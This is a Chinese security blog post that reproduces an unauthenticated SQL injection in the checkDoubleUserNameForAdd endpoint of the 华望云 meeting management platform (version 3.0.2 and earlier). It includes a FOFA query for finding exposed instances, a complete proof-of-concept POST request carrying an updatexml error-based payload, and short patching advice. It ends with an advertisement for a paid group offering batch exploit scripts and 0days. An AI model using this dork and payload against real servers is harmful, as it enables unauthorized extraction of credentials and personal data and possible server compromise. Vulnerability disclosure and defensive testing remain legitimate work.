#  「漏洞复现」华望云会议管理平台 checkDoubleUserNameForAdd SQL注入漏洞   
冷漠安全  冷漠安全   2024-09-19 18:42  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
华望云会议管理平台是一款基于云计算技术的远程音视频互动软件，致力于为用户提供便捷、易用、低成本的会议解决方案。该平台拥有丰富的功能和广泛的应用场景，能够满足不同用户在不同场景下的会议需求。  
  
0x03  
  
**漏洞威胁**  
  
华望云会议管理平台 checkDoubleUserNameForAdd 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
影响范围：  
  
version <= 3.0.2  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
title="华望云会议管理平台"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rdv2oYLSUjbmnia58frtMdaiaWibpHv5lLNJWmAMx7wtwhKLrNlicbkMdMChcCA9IuD4vgb9GHOz1Nuw/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /ajax/checkDoubleUserNameForAdd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest


userName=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+MD5(123456))),1))+and+'%25%25'+like+'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rdv2oYLSUjbmnia58frtMdar3FwAyOvEiazXWlc68gQW6z8ZfRX4m1v36NQEStfuDrOFY7PAIDXBaw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rdv2oYLSUjbmnia58frtMdatMic3JhK1k0Y6e1M9L3Vq31ktibaDHicB463n2cEuOtLD4zVOHibYPWib5g/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rdv2oYLSUjbmnia58frtMdaJd3jMD7Sd2Ggw6DLceV3XRazbgbAN8xCxWVml32tDMic8S0z9ZhJia3Q/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0rdv2oYLSUjbmnia58frtMdatdhS7k75MRAIVDm91TkwG6nIMTeS8WibEwJFuQ7SonNopLmhicl34hMw/640?wx_fmt=gif&from=appmsg "")  
  
  
